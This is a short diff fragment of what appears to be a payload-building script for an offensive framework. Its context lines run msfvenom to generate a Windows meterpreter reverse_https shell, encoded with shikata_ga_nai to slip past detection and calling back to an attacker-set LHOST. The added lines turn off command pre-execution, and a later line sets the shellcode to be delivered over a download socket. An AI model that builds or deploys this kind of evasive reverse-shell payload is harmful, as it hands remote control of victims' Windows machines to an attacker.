@@ -28,6 +28,10 @@ LHOST=$GLOBAL_LHOST
 # create payload in /var/www/html
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -b '\x00' -f raw -a x86 --platform Windows > output/thepayload.bin
 
+# no command preexec
+set_command_source none
+set_command_exec none
+
 # set shellcode source
 set_payload_source download_socket
 
